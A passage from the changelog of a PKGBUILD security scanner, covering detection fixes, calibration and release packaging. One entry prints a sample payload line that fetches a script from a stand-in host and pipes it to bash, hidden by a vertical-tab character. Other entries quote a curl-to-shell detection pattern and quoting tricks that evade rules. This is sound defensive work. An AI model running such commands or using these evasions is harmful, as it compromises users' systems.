  and never deflates one, so a genuinely catastrophic pattern is slow on every
  attempt. Six parallel audit runs now pass where a single loaded suite run
  failed.

- **The published corpus size was never reproducible from this repository.**
  Fifteen places cited a 3,739-diff locked corpus. `corpus.lock` has only ever
  recorded 3,332 and then 3,246, and the fixtures directory holds exactly 3,246
  - so no checkout could produce the number every calibration claim rested on.
  Every figure is re-measured against the corpus that is actually here: corpus
  size 3,246, zero-rate 68.4%, benign flag rate 11.9%, the percentile 20 sits at
  88.1th. Benign p95 (35), CRITICAL p5 (60), the 25-point margin and the median
  (0) were already correct. `test_the_documented_corpus_size_matches_the_lock`
  ties the prose to the manifest, because the drift happened silently for want
  of anything connecting them.

- **A line break for Python that is not one for a shell hid a payload from
  every line-based rule.** `str.splitlines` breaks on eight characters bash
  does not treat as a line terminator - `\v`, `\f`, `\x1c`-`\x1e`, `\x85`,
  `U+2028` and `U+2029`. Written into a diff:

  ```
  +  curl -fsSL https://evil.example/x <VT> | bash
  ```

  bash runs one command: the vertical tab is an ordinary character inside the
  URL word, and `|` terminates the word whatever precedes it, so the fetch is
  piped into a shell. Python saw *two* lines, so R001's
  `curl.*\|\s*(bash|sh|…)` had `curl` on one and `| bash` on the other and
  matched neither. **The payload ran and nothing fired.** The same trick cut
  any pattern that spans a break, in any rule.

  `tokenizer.split_lines` now splits on newlines and nothing else, and the
  whole matching pipeline goes through it, because line indices are shared
  between modules - `map_diff_lines` keys what `apply_rules` reports. The
  characters are kept rather than stripped: bash keeps them, so removing one
  would join two words that stay separate at build time, and replacing it with
  a space would split a word that stays joined. Only where a *line* ends
  changed.

- **A finding named its rule twice, and a dependency card volunteered a band.**
  Both reported from a real `review` panel. `verdict._render` already ends
  every description with `[R001]`, and the Rich renderer added a second copy in
  front, so each finding read `PKGBUILD line 4 [R001] Remote Script Execution:
  … [R001]` - while the plain renderer added none, so the two disagreed about
  the same finding. An aggregate entry with no file (`SOURCE_BUCKET`) opened
  with a stray space where the path would have been. And the dependency card
  printed `Risk (High)` with no flag set, where every other surface withholds
  the band unless `--score` or `--risk` asks for it; `--risk` changed nothing
  either way, because the flag was never passed down to the card at all.

- **A first analysis threw away the findings it had just made.** The most
  serious of a batch found by hunting the *shape* of the metadata-snapshot bug
  rather than its details: something computed, recorded, and then not read.

  `_make_fresh_analysis` ran the recency check, the new-package check and the
  committed-tree scan, handed the results to `insert_analysis`, and then built
  the fact with an empty `score_breakdown` and a hardcoded score of 0. A
  first-seen package shipping an ELF binary in its git tree - R118, the Atomic
  Arch delivery shape - reported **Low, score 0, no findings**, with the
  finding sitting in the database row it had just written. First-seen is the
  case with the least prior evidence about a package, so it is the last one
  that should be reported clean without looking. The corpus path in
  `full_aur/analyze.py` had been scoring its own first-seen facts all along;
  the two had drifted. The review path now uses the same scorer, and carries
  the maintainer and the IOC matches it can also see without a diff.

- **`[limits] default_review_limit` was documented, shipped, and never read.**
  `--limit`'s own default of `0` won on every invocation, so a user who set the
  key saw no change. It is honoured now, and the shipped value moves from `20`
  to `0`: a review that stops early has not looked at the rest, and narrowing
  what an existing install covers is the wrong direction for the default. An
  explicit `--limit 0` still means all of them and beats the config.

- **A truncated review reported the truncation as a smaller problem.** With
  `--limit 5` against 40 outdated packages the summary read "5 package(s)
  needing update and reviewed": the count of packages *needing* an update was
  silently replaced by the count the limit let through, so the number was wrong
  in the direction that reads as reassuring, and the 35 skipped were never
  mentioned. The summary now names them.

- **Two sections existed only on the Rich renderer.** `inspect` without Rich
  showed no *Resolved commands* section at all - the reconstructed command text
  behind a finding, the deobfuscated `curl` a rule matched on - and no
  maintainer or line counts. `review --verbose` handed off to the full inspect
  panel on the Rich path and returned the same summary on the plain one, so
  asking for detail got you detail only if Rich happened to be installed. Both
  renderers now carry the same sections, and `tests/test_output_parity.py`
  compares them against each other rather than only against the JSON body,
  which is what let the gap sit there: the fixture never populated
  `execution_changes`, and a renderer exercised with an empty section is not
  exercised.

- **The AUR-side version dropped the declared `epoch` and `pkgrel`.** Reported
  by the maintainer of `oolite-git`, whose recipe declares `epoch=1`,
  `pkgver=1.93.1.r7966.7ccbff5e` and `pkgrel=2`, against an install of
  `1:1.93.1.r7967.caea422f-2`. `inspect` rendered the right-hand side as
  `1.93.1.r7966.7ccbff5e`, because `get_pkgver_from_head` matched `^pkgver=`
  and nothing else. The two sides of that line were not the same kind of
  object.

  It was not only display. `compare_installed_to_aur` compares epochs first
  and parses an absent one as zero, so a **non-VCS** package declaring
  `epoch=1` compared 1 against 0 and came out as *installed ahead*: a real
  update reported as a backwards move. `oolite-git` never reached that branch
  only because the VCS short-circuit fires first.

    - `full_version_from_pkgbuild` assembles `[epoch:]pkgver[-pkgrel]` from
      the recipe's own fields. A component that is not literal - `pkgver=$_ver`
      - is omitted rather than guessed at, and no literal `pkgver=` at all
      returns nothing, leaving the existing fallbacks in charge.
    - With both sides full, they are compared as full versions, pkgrel
      included, which is what pacman and every AUR helper do. An AUR `pkgrel`
      bump is now the update it always was; it used to render as "no change"
      even though discovery had just listed the package as outdated on
      exactly that difference. A side that declares no pkgrel still compares
      by epoch and pkgver alone - a pkgrel that was never declared cannot be
      a difference.

- **"Not comparable" never said why, so the reporter reasonably blamed the
  epoch.** `oolite-git` is inconclusive because it computes its version in
  `pkgver()`, which is a deliberate refusal: the AUR text records whatever
  the maintainer's last build produced, so it is stale by design rather than
  predictive. That reasoning was in the source and not in the output. The
  version line now names the cause, and distinguishes it from the other case
  the same constant covers - a version that could not be read at all -
  without adding a field to the report body.

- **A first analysis still drew the backwards arrow.** The reporter's first
  `inspect` printed `1:1.93.1.r7967.caea422f-2 -> 1.93.1.r7966.7ccbff5e` and
  the second, with a prior analysis on record, printed "not comparable":
  whether a downgrade was drawn as an update depended on how many times the
  package had been inspected. `_make_fresh_analysis` never set
  `version_comparison`. The suppression added in 0.12.0 had landed on the
  incremental path only.

- **The inspect panel printed `First analysis.[]` and said Status twice.**
  `[]` is not a Rich close tag, so it rendered literally and the style never
  closed; the same row duplicated the Status line the foot of the panel emits
  unconditionally.

- **A quadratic pattern was scored safe because its alphabet was punctuation.**
  `_representatives` harvested escapes, character classes and the first
  *alphanumeric* literal, so `/+$` derived no alphabet at all, `growth_ratio`
  fell back to probing with `a` - which `/` can never match - and both
  measurements came back at zero. Zero is below the noise floor, the growth
  check was skipped, and a skipped measurement scored the same as a fast one.
  The module's docstring had already named this class of failure: "a fixed
  probe list is the attacks somebody thought of, and the classes it omits
  score zero rather than unknown". The `or ["a"]` fallback was the same trap
  one level down, unguarded.

    - Literals are now harvested whatever their character class, with the
      pattern's *syntax* - a `:` from `(?:`, a digit from `{1,64}`, a class
      body - stripped first, since probing with syntax is the same wrong
      alphabet in a different costume.
    - The fallback for a pattern whose alphabet cannot be derived is several
      characters wide, and says in place that unmeasured is unknown, not safe.
    - The widened detector immediately caught a **shipped** rule: R007's
      `\+.*\.install.*` is quadratic. It is now `^\+.*\.install`, matching
      exactly the same text on an added line, where the diff marker is at
      position 0. An installation written before this release still holds the
      old pattern and, because a refused pattern stops matching *silently*,
      would lose the rule: the superseded pattern is registered so
      `trustsight config sync-rules --update` repairs it, `trustsight lint`
      reports it as an ERROR, and the refusal log now names the pattern.

- **`review` compared against a metadata snapshot it never refreshed, so a
  machine with pending AUR updates was told it had none.** Reported from a
  0.13.1 install where `trustsight review` printed "No outdated packages
  found" while `yay -Syu` listed four AUR updates on the same system. The
  snapshot was downloaded on first run and reused unconditionally from then
  on: `load_metadata` recorded `snapshot_time` and no caller ever read it,
  and the only code path that refetches the dump is the corpus builder, which
  a `review`-only user never runs. So this was not an edge case, it was every
  installation's steady state after the first day.

  The failure mode is what makes it severe rather than merely wrong. A stale
  snapshot does not produce an error or an empty result: every installed
  package resolves to the version the snapshot recorded, `vercmp` says they
  are equal, and the tool answers "nothing to review" in green. The one
  output a security tool must never produce quietly is *all clear* when it
  has not looked.

    - The snapshot is now refetched once it is older than
      `[discovery] metadata_ttl_minutes` (default 60, matching the RPC path's
      `cache_ttl_minutes`), and `load_snapshot` returns the timestamp
      alongside the packages so the age cannot be dropped on the floor again.
    - A snapshot with no recorded timestamp counts as stale, so an existing
      install self-heals on its next review rather than needing the file
      deleted by hand.
    - A refresh that fails keeps the snapshot on disk and **warns**, naming
      its age and saying a package updated since then will not be reported.
      Falling back to "no outdated packages" on a network failure would
      reproduce the original bug at the moment the user is least able to
      notice it. An empty dump is refused for the same reason: it would
      overwrite a working snapshot with nothing.
    - `metadata_ttl_minutes = 0` restores the old behaviour for an offline
      machine that must pin the snapshot it has.

- **The AUR PKGBUILD advertised v0.13.1 with v0.13.0's checksum.** Reported
  by a user, and accurate: the recorded `f083582...` is the v0.13.0 tarball,
  while v0.13.1 hashes to `6c19cea4...`. The checksum was written by a second
  commit *after* the tag, because GitHub's on-demand archive cannot exist
  until the tag does, so every release passed through a window where the
  branch was inconsistent. For v0.13.1 the workflow that closes that window
  failed and the window never closed. Contributing cause: `check()` run from
  the release tarball failed three tests, one of which was a direct
  contradiction between `.gitattributes export-ignore` (which removes
  `packaging/` from the archive) and the `critical paths are synchronised`
  gate (which required `packaging/aur/PKGBUILD` to exist).

### Changed

- **The source is a release asset built by this repository, not GitHub's
  generated archive.** `scripts/build_release_tarball.py` produces the
  tarball deterministically: mtimes, uid/gid and member order normalised,
  gzip given no timestamp, output a pure function of the paths and contents
  `git archive` selects. Because `packaging/` is export-ignored, recording
  the checksum in the PKGBUILD cannot change the tarball it describes, so the
  checksum ships in the same commit as the version bump and no repair step
  exists to fail. Release assets are immutable, which also closes the
  long-standing exposure to GitHub regenerating archives and invalidating
  recorded checksums, as it did ecosystem-wide in 2023.

- **`release-pkgbuild.yml` verifies instead of repairing.** It no longer
  computes a checksum or commits to the default branch. On a published
  release it rebuilds the tarball from the tag, asserts the PKGBUILD already
  records that checksum, asserts the published asset is those exact bytes,
  and then builds and installs it with `check()` enabled.

- **The critical-path existence check tolerates the archive.**
  `ARCHIVE_EXCLUDED_PATHS` in `scripts/critical_paths.py` names the paths
  `export-ignore` legitimately removes; the gate skips their existence check
  when running from an extracted tarball and enforces it everywhere else.
  `test_packaging_is_export_ignore_from_archives` skips when there is no git
  checkout to archive rather than failing on `dubious ownership`.

### Stats

- 6 commits since v0.13.1
- 2599 tests (57 files), all passing
- 65/65 security gates, 10/10 calibration gates
- Package version 0.13.2

## [0.13.1] - 2026-08-12

### Fixed

- **The PKGBUILD workflow failed twice on every release.** A release moves
  `pkgver` and the recorded checksum in two separate commits, and it cannot
  do otherwise: the checksum is of the tarball GitHub builds from the tag, so
  it is unknowable until the tag exists. `pkgbuild.yml` runs on every push,
  including the version-bump commit and the tag pointing at it, and asserted
  that the recorded checksum matches the tarball for the recorded version.
  Between those two commits that assertion cannot hold, so the job failed for
  a state the release procedure guarantees, once for the branch push and once
  for the tag push. The workflow now identifies the window (the tag for
  `pkgver` does not exist yet, or `HEAD` is the tag's own commit) and skips
  the tarball steps with a notice. Outside the window the assertion is
  unchanged and just as strict.

- **`check()` never ran against the release tarball it was added to
  protect.** v0.12.1 added a build of the shipped artifact so a regression
  that breaks it fails CI instead of reaching users, but that build lives in
  `pkgbuild.yml` and could not see the release it was meant to guard. The
  only commit where the checksum assertion can pass is the
  `packaging: set checksum for vX` commit, which `release-pkgbuild.yml`
  pushes with `GITHUB_TOKEN`, and GitHub does not trigger workflows from such
  pushes. The guarantee therefore first held on the next unrelated push, well
  after users could install the release. `release-pkgbuild.yml` now builds
  and installs the tarball itself (`makepkg -si --noconfirm`, no `--nocheck`)
  in the job that already has the container, the tarball and the corrected
  PKGBUILD, so the release run proves the artifact before publishing it.

### Stats

- 4 commits since v0.13.0
- 6 files changed, +106 / -6
- 2029 tests (47 files), all passing
- 51/51 security gates, 10/10 calibration gates
- Package version 0.13.1

## [0.13.0] - 2026-08-12

### Added

- **A public API (`trustsight.api`).** Every flow the CLI drives is available
  as a library: `TrustSight` exposes `inspect`, `analyze_text`, `review`,
  `refresh_corpus`, `watch`, `pivot`, `history`, `packages`, `forget`,
  `prune`, `config` and `status`, returning frozen dataclasses (`Report`,
  `ReviewResult`, `Finding`, `HistoryEntry`, `TrackedPackage`, `CycleReport`,
  `PivotResult`, ...) whose `to_dict()` is byte-identical to the
  corresponding `--json` output. The `trustsight` package resolves these
  names lazily (PEP 562), so `import trustsight` for `__version__` alone
  never loads typer, rich or the analysis stack. The CLI and the API share
  one pipeline: the review engine moved out of `cli/review.py` into
  `trustsight.review`, and `cli/review.py` keeps its historical spellings as
  re-exports. `review --json` during a metadata bootstrap now reports
  `{"status": "metadata_downloaded", ...}` and stays a pure JSON document.
  See [python-api.md](reference/python-api.md).

- **Shared CLI/API evaluation semantics.** The public API and CLI now consume one reporting layer for findings, verdicts, risk bands, coverage, changes, suppressions and JSON serialization. API limits, explicit package lists and watch parameters are validated before analysis begins, and API results are returned as dataclasses without rendering terminal output.

- **Public API inputs are bounded before side effects.** Package and indicator names, repository and package lists, PKGBUILD text, metadata text, and history/review limits now have explicit ceilings with type and boolean validation.

- **Adversarial security coverage.** Deterministic tokenizer fuzzing, regex audits, differ hostile-input checks, archive hardening tests and critical path policy tests are now part of the test and security-gate coverage.

- **A rule taxonomy (`RuleCategory`).** `src/trustsight/categories.py` gives
  every documented rule exactly one category naming the kind of claim it
  makes: `fetch-and-execution`, `obfuscation`, `deception`,
  `install-and-persist`, `staging-and-recon`, `integrity`,
  `naming-and-dependency`, `maintainer-and-metadata`, `temporal`,
  `composition`, `count-based`, `corpus-behavioral`, and `crossfire`
  (reserved, no rules). This is a different axis from the per-rule
  `category` field, which names the capability a match touched and is what
  R072 counts; nothing about findings, scoring or the report payload
  changes. `RULE_CATEGORIES` maps all 128 documented sections,
  `category_of()` and `rules_in()` read it, and `tests/test_docs.py` fails
  if a rule is uncategorised, documented on a page its category does not
  own, or missing from the index.

### Changed

- **The rules reference is one page per category.** `reference/rules.md`
  became `reference/rules/`, with [an index](reference/rules/index.md)
  carrying the type legend and a quick-reference table for all 128 rules,
  one page per `RuleCategory`, and
  [`system.md`](reference/rules/system.md) holding everything that is not an
  individual rule definition: the `rules.toml` field table, the severity
  weights, the FATAL short-circuit, the measured fire rates, the Class A to
  E taxonomy, the C-series and D-series sections, and the reserved
  identifier ranges. Every meta anchor (`#c-series`, `#d-series`,
  `#fatal-rules`, `#class-d-rules`, `#experimental-fire-rates`,
  `#not-rules`, ...) keeps its spelling on `system.md`, which also keeps a
  stub anchor for every rule id pointing at the page that now defines it, so
  no `#rXXX` link breaks. The index's legend and table are generated by
  `scripts/build_rules_index.py`. Rule text is unchanged.

- **Differ input is bounded and deterministic.** Generated patches, companion files, paths, and extracted URL tokens now have explicit limits; companion blobs are checked before reading, malformed hunks fail closed, and URL/file summaries use stable ordering. Adversarial differ tests and security gates cover hostile size, malformed syntax, and repeatability.

- **Diff truncation is UTF-8-safe and shared across analysis paths.** Git and offline analysis use the same bounded prefix helper and preserve an explicit truncation flag, so partial multibyte input cannot corrupt parser text and truncated results remain covered by `diff_truncated`.

- **The rules reference documents every implemented rule.** Added sections
  for R132 (Indirect Command Expansion), R136-R140 (Committed File Executed
  Without Declaration, Fetch Then Execute, Downloaded Source File Executed,
  Service ExecStart Targets Undeclared Binary, PATH Injection With Undeclared
  Directory) and a Declared-practice findings subsection for P001-P007; the
  delivery section header and Tier A span now cover R001-R140.

- **Tokenizer hostile-input coverage was expanded.** A deterministic fuzz harness now exercises assignments, nested and cyclic expansion, malformed quoting, arrays, namerefs, command substitutions, diff markers, Unicode, memoization and the `scan_diff` boundary. It asserts bounded output, termination, deterministic results and JSON-safe integration output without changing the deliberately open R133-R135 behavior.

- **Regex backtracking remains bounded by input clamping.** Rule matching still uses Python's standard `re` module; every logical line is clamped to 8 KiB before matching and the security gates measure hostile matching time. A staged regex hardening plan is documented in the security model rather than adding a new runtime dependency without comparative evidence.

- **Configured regexes now fail closed at runtime.** A pattern that exceeds the bounded adversarial probe budget is refused by the rule compiler instead of being run against package-controlled text. `scripts/regex_audit.py` audits configured and source patterns, and `scripts/benchmark_regex_engines.py` provides an optional comparison with the third-party `regex` engine without adding it as a runtime dependency.

- **CI actions are pinned to immutable commit SHAs.** GitHub workflow actions no longer follow mutable version tags, and the signed-commit workflow shares one canonical critical-path list with the security policy and contributor guidance.

- **Seed archive handling is stricter.** Seed imports now cap archive member counts and refuse symlinks, hardlinks, device nodes and FIFOs before extraction, preserving the existing size and path-containment limits.

- **Documentation and default-report language were aligned with the security model.** The README now describes deterministic evidence reports rather than risk-score verdicts, documents the opt-in `--score`/`--risk` display, removes the obsolete LLM wording, and points at the published documentation site.

### Stats

- 19 commits since v0.12.1
- 84 files changed, +8112 / -2415
- 2029 tests (47 files), all passing
- 51/51 security gates, 10/10 calibration gates
- Package version 0.13.0

## [0.12.1] - 2026-08-11

### Changed

- **The release tarball's checksum is validated end to end in CI.** The Arch
  containers install git before checkout, so `actions/checkout` performs a
  real clone instead of falling back to the source archive (which honours
  `.gitattributes` `export-ignore` and therefore omits `packaging/`). The
  `PKGBUILD` workflow downloads the actual shipped tarball, fails the build
  with an explicit error on a checksum mismatch, and builds from it with
  `makepkg`; no `--skipchecksums` anywhere. The release workflow computes the
  checksum from the served tarball, verifies it with
  `makepkg --verifysource`, and commits the PKGBUILD and `.SRCINFO` to the
  default branch; the tag stays frozen so the tarball, and therefore the
  checksum, stays stable.
- **The PKGBUILD CI job now executes `check()` against the release tarball.**
  The build step dropped `--nocheck`, so a regression that breaks the shipped
  artifact fails the `PKGBUILD` workflow instead of reaching users.
- **Calibration figures refreshed to the 3,246-diff locked corpus.** The
  published numbers now match the committed corpus: 69.1% benign zero-rate,
  benign p95 = 45 against malicious p5 = 60, strict positive separation as
  the only separation gate. The stale 3322-diff references and pre-B10
  numbers across [security.md](security.md), the reading-a-report guide,
  fire-rates, the benchmarks page and the index pages were reconciled, and
  the CONTRIBUTING quick start now runs the security gates.
- **The README was modernized** to match the current CLI surface and the
  signed release channel, with verified links across the documentation.

### Added

- **R122: the corpus path reports archive trailer anomalies.** The snapshot
  tarball bytes fetched for the full-AUR corpus now go through
  `check_archive_trailer`, a pure function over bytes: trailing bytes after
  the gzip member, a missing tar end-of-archive block, or content after the
  zip end-of-central-directory record produce a stamped R122 finding,
  surfaced exactly like the R118-tree scan results. The review path still
  never downloads PKGBUILD-declared URLs, so R122 only ever sees the AUR's
  own snapshot tarballs; see [rules.md](reference/rules/integrity.md#h070).
- **The malicious corpus is committed source.** All 164 malicious `.diff`
  bodies are now committed (a gitignore override for
  `tests/fixtures/malicious/`), so a fresh clone runs the recall and
  separation gates on the full corpus with no generator step.
  `scripts/verify_fixtures.py` checks every `expected.json` record against
  its `.diff` (no missing bodies, no orphans, per-category counts), and a new
  `fixture-determinism` job regenerates all five generators on a fresh
  checkout and fails if the tree drifts from the committed record.
- **A signed-commit policy, enforced on critical paths.** Changes to the
  tokenizer, scoring, config, database, security gates, CI workflows,
  packaging, and baseline keys must be GPG-signed: `.github/CODEOWNERS`
  assigns those paths to the maintainer, the `verify-commit-sigs` workflow
  checks every critical-path commit in a pull request to `master`, and
  `CONTRIBUTING.md` documents key setup and the list of critical paths.

### Fixed

- **The release archive failed its own `check()` step.** Six tests in
  `tests/test_pkgbuild.py` read `packaging/aur/PKGBUILD`, which GitHub source
  archives exclude by `.gitattributes` `export-ignore` (a tarball cannot
  contain the PKGBUILD for its own checksum). `makepkg -si` from the v0.12.0
  archive aborted with six failures. The PKGBUILD-hygiene tests now skip when
  `packaging/` is absent, and still run in the repository checkout where the
  PKGBUILD lives.

### Stats

- 11 commits since v0.12.0
- 198 files changed, +2370 / -425
- 1536 tests, all passing
- Package version 0.12.1

## [0.12.0] - 2026-08-10

### Added

- **A release channel for every baseline.** All baselines the tool consumes
  now ship as signed GitHub release assets with the `baseline-` prefix:
  `baseline-seed.tar.gz` (the hashed novelty seed),
  `baseline-ioc-<source>-<incident>-manifest.json` / `-iocs.jsonl` (per-curator
  IOC baselines), `baseline-corpus.tar.zst` (the corpus baseline) and
  `baseline-manifest.json` (per-asset SHA-256, size and signature). Every
  asset carries a detached Ed25519 `.sig` under the pinned distribution key,
  verified before any payload is read; a download that does not verify is
  refused, never imported. New in the tool: `trustsight seed fetch` (download,
  verify, import), release-channel `ioc update` (per-curator verification
  preserved on top of the distribution signature), first-run auto-import of a
  missing seed from the channel, and `scripts/build_release_baselines.py`
  (build, sign, self-verify, manifest). The
  [`.github/workflows/baselines.yml`](https://github.com/emiliano-go/trustsight/blob/master/.github/workflows/baselines.yml)
  workflow builds and uploads the seed, IOC and manifest assets on every
  published release, signing with the `BASELINE_SIGNING_KEY` Actions secret;
  the corpus baseline is exported by the maintainer and uploaded per the
  publishing guide.
- **A security model, stated and enforced.** [`docs/security.md`](security.md)
  is now the canonical page: TrustSight as a program consuming hostile input
  (Part A), what a verdict claims and does not claim (Part B), an enforcement
  map (Part C), and a vulnerability disclosure policy written for a static
  analyser, with supported versions, severity timelines, and an explicit list
  of what is not a vulnerability (Part D).
- **`scripts/security_gates.py` and a CI job.** Forty-five gates, one per
  invariant: no interpreter or shell execution, version arguments
  shape-checked, network confined to the four fetch modules, one declared host,
  every request timed out, bounded rule matching, bounded and never-indirect
  expansion, data-driven rendering, no archive extraction, parameterised SQL,
  inert terminal output, coverage failing closed, a gap always shown with the
  band, FATAL integrity, seed and baseline containment, reserved names refused
  by every writer. The v0.12.0 additions guard the two new subsystems: an IOC
  match always carries its source (A13b), never contributes to the score (B1),
  is reported when expired rather than silently dropped, and never appears in
  the rule config layer; the novelty seed stores no plaintext identity (P1) and
  hashes deterministically. Three gates guard the
  documentation rather than the code: the maturity numbers in B3 must be derived
  from `scoring._MATURITY_THRESHOLD` rather than copied beside it; every link
  between pages under `docs/` must resolve to a file and an anchor that exist;
  and the doc and the gate list must still describe the same set, so a guarantee
  cannot be added to one without the other.
- **Coverage accounting (`src/trustsight/coverage.py`).** Four gaps are now
  first-class on `PackageFact` and in the JSON: `diff_truncated`,
  `line_truncated`, `tree_not_analyzed`, `unresolved_source`. A gap never adds
  points, but it constrains presentation two ways: it forbids an UNFLAGGED
  verdict (the run reports `Inconclusive` unless a HIGH or worse finding already
  stands), **and** it travels with the band wherever a person sees one, so an
  incomplete run renders as `High (incomplete analysis)` rather than `High`.
  That second half closes the decoy seam: pad past the cap, put the payload
  after the cut, and include one cheap deliberate HIGH in the visible prefix.
  Reported as a weight-0 `COVERAGE` entry in the breakdown and quoted in
  `unresolved_sources`. Machine output keeps `risk` bare with `coverage_gaps`
  beside it, plus `risk_label` for consumers that display a band.
- **`src/trustsight/safe_text.py`.** `clean()` and `safe_markup()` strip ANSI
  and OSC sequences, C0/C1 control bytes and DEL, and neutralise Rich markup,
  applied at every render boundary in `cli/`. Stored evidence and JSON output
  stay byte-exact.
- **`PackageFact.risk`.** The verdict band is now carried on the fact and read
  through `scoring.verdict_level()` (bare band, for machines) or
  `scoring.verdict_label()` (qualified, for people).
- **IOC Federation baseline system (v0.12.0, `src/trustsight/ioc_baseline.py`).**
  A signed, multi-curator, time-bounded inventory of known-bad artifacts
  (domains, file hashes, package names) that sits outside the heuristic score.
  Baselines are Ed25519-signed directories (`manifest.json` + `iocs.jsonl`),
  imported per source and replaced idempotently; each match names the curator
  that flagged it (attribution, not aggregation), carries its incident and
  evidence URL, and reports expiry rather than silently lapsing. A new
  `IOC Match` stage runs after rule matching and attaches
  `PackageFact.ioc_matches`; matches never enter `score_breakdown` and never
  move the number. New `[baselines.ioc]` config section, `ioc_entries` table,
  and `trustsight ioc {sources,import,update,list,export}` commands. See
  [the IOC reference](reference/ioc.md).
- **User-data hashing for the novelty seed (v0.12.0).** The bundled seed's
  ~36k maintainer names and emails are stored as salted SHA-256 hashes, not
  plaintext: the novelty and maturity signals need only "have we seen this
  identity before", never the literal string. A per-seed 32-byte salt defeats
  precomputed tables; the salt travels in `seed_meta`. Names and emails are
  normalised (`strip().lower()`) at one hashing chokepoint so the seed build,
  the plaintext-to-hashed migration, and every runtime lookup agree. An old
  plaintext seed is migrated on first run and the original table renamed to
  `maintainers_deprecated_backup`. New `maintainers_hashed` /
  `package_maintainers_hashed` tables and `trustsight seed {info,stats,migrate}`
  commands. Documented in [seed provenance](explanation/seed-provenance.md).
- **Committed-file scanning (`differ.companion_source_hunks`).** A payload that
  ships as a file inside the AUR repo (declared in `source=()` or merely named
  by the recipe, e.g. `bash "${startdir}/helper.sh"`) is now read with the same
  rules as the PKGBUILD. The differ used to feed only `PKGBUILD`, `.SRCINFO`
  and `*.install` to the scanner, so a `curl | bash` moved one file over
  reached no rule; the whole current content of every companion the recipe
  names is scanned, so a payload committed earlier and referenced later is
  still seen. Unreferenced committed files are left alone.
- **Two coverage gaps.** `unresolved_source` now tracks a multi-line
  `source=()` array whose `$(...)` rides a continuation line, not only the
  opener; and `unresolved_parse_time` records a top-level command substitution
  that runs while makepkg *sources* the PKGBUILD for metadata, before any rule
  reads it. Both fail closed to `Inconclusive`.
- **R137 (Fetch Then Execute, CRITICAL).** The split download-then-run form a
  reviewer would read as two innocuous lines: a downloader writes a file and
  the same function later executes it. R001/R002 own the single-line pipe;
  R137 owns the split.

### Changed

- **The release channel is its own release kind.** Baseline assets
  (`baseline-*`) ship on `baseline-<date>` channel releases, published after
  the software release they serve so the tool's default `latest` channel
  resolves to them; software releases (`vX.Y.Z`) never carry baseline assets.
  The release baseline workflow only runs for `baseline-*` tags and manual
  dispatch.
- **The novelty seed no longer ships inside the package.** The 20 MB
  `src/trustsight/data/seed.db.gz` is gone from the repo, wheel and package;
  the seed is distributed as the signed `baseline-seed.tar.gz` release asset
  (v2 hashed format). First-run auto-import keeps working by fetching and
  verifying the channel asset (silently skipping on failure or offline), and
  `seed fetch` imports it on demand. The security model's network doctrine
  now names **two declared hosts**: `aur.archlinux.org` everywhere, and
  `github.com` confined to the new fetch module `release.py` (seed fetch,
  `ioc update`, first-run import), with the `network confined to the fetch
  modules` and `one network host, declared` gates updated to match.
- **`trustsight full-aur` is safe by default: no accidental whole-AUR scrape.**
  A missing snapshot used to silently trigger a from-scratch bootstrap that
  fetched every PKGBUILD in the AUR (~120k). That now **refuses** unless
  `--bootstrap` is passed. Every cycle, delta or bootstrap, is capped at
  `[limits] corpus_max_per_cycle` (default 2000) and resumes automatically, so
  a large amount of work advances in bounded, resumable chunks instead of one
  avalanche; a capped cycle does not advance the snapshot, run the corpus
  sweep, or export a half-built corpus until the transition completes.
  `--resume` is now implied (cycles resume on their own) and kept only for
  compatibility. The intended cadence is incremental: run `full-aur`
  periodically so each cycle fetches only the changed packages.
- **`trustsight full-aur` is faster, rate-limited, and shows progress.** The
  corpus build fetched one PKGBUILD per package serially, with feedback only
  every 1000 packages. PKGBUILDs are now fetched a window ahead, several at a
  time (`[limits] corpus_fetch_workers`, default 5); analysis stays serial and
  in package order so novelty still reads earlier packages' observations. The
  fetcher is a good citizen to the AUR's cgit (which rate-limits per IP and
  runs anti-scraping): a global aggregate rate cap (~5 requests/second) bounds
  the request rate regardless of worker count, and requests retry with
  exponential backoff on `429`, `5xx` and connection resets, honouring a
  `Retry-After` header. On an
  interactive terminal the analysis loop renders a live progress bar on stderr
  (current package, `M/N`, elapsed, ETA), and falls back to periodic log lines
  when there is no TTY or under `--json`. Benign per-package snapshot fallbacks
  (a VCS or `-bin` package with no tarball) dropped from a warning per package
  to debug, and a genuinely unfetchable PKGBUILD is counted and reported once.
  A latent `TypeError` on the reserved-name path (`_logger()` called without
  its argument) is fixed.
- **The tokenizer normalises partial quoting.** `c"u"rl` and `ba"sh"` are
  reconstructed to `curl` and `bash` before rules match, the non-empty twin of
  the empty-quote rule, so intra-word quoting no longer hides a literal from
  the resolved-line rules. A standalone quoted argument (a message, a URL, a
  `depends` entry with structure) keeps its quotes, so tokenisation for the
  other rules does not shift.
- **Maintainer identities hash through one chokepoint.** `db._hash_maintainer_value`
  delegates to `seed_build._hash_value`, and both normalise `strip().lower()`,
  so a maintainer whose name or email differs only in case or whitespace is one
  identity rather than a fresh novelty signal every time. The two formulas used
  to be copied in two modules; identical then, they could drift, and a drift
  would silently miss every lookup.

- **Declared verification is no longer credited (B10).** Checksums,
  `validpgpkeys`, GPG signature sources, source pinning and trusted-forge
  hosting were worth up to 25 points of discount. They are now weight-0
  findings in a new `P` namespace (`P001`-`P003`, `P005`-`P007`), reported in
  their own group under the line "TrustSight does not verify these claims. It
  reports that the recipe makes them." `[verification_evidence]` and
  `[pinning_weights]` are removed from the shipped config, so a local
  `config.toml` cannot reintroduce a credit, and `trusted_forge` is 0.

  These are **declared-practice findings**, not benign rules: they do not
  establish that anything is benign, only that the recipe declares a practice.
  Everything TrustSight sees is attacker-declared and TrustSight never fetches,
  so a signal an attacker can assert for free must not be able to lower a score.

  **Measured consequence.** Benign p95 moved 35 to 45 against the 3,246-diff
  corpus, and benign diffs above the 20-point threshold moved 8.9% to 16.3%.
  Separation still holds (benign p95 45 < malicious p5 60) with the margin
  narrowing from 25 to 15. The `control-bin-package-declared-source` fixture
  moved 20 to 35: it remains a control for the delivery rules and is no longer
  one for the threshold. Twenty is left as the published threshold because
  moving it is a calibration decision with its own evidence.

- **`docs/security.md` no longer claims 20 is the benign 95th percentile.** It
  was, before B10; it now sits at the 83.7th. The page states the measured
  distribution instead, and the gate fails if the stale claim returns.

- **Every page describing the subtractive model rewritten**: the scoring
  formula and tier map in `rules.md`, the Tier D tables in `evidence-tiers.md`,
  the "Why verification subtracts" section in `scoring-philosophy.md`, the
  worked examples and breakdown legend in `reading-a-report.md`, plus
  `configuration.md`, `explanation/index.md`, `corpus-and-priors.md`,
  `cold-start-and-maturity.md`, `auditing-before-update.md`,
